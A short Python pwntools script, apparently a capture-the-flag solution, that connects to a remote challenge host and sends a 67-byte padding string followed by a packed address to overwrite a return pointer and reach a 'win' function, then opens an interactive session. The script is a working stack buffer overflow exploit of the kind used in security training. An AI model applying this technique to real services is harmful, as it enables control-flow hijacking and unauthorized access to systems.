from pwn import process, remote

#p = process("./pwnme")

p = remote("0.cloud.chals.io", 22209)

offset = "A"*67
win_func = "\xd6\x91\x04\x08"
payload = offset + win_func

#p.recvline() #needed in dist program but not on server
#p.recvline()
p.sendline(payload)

p.interactive()
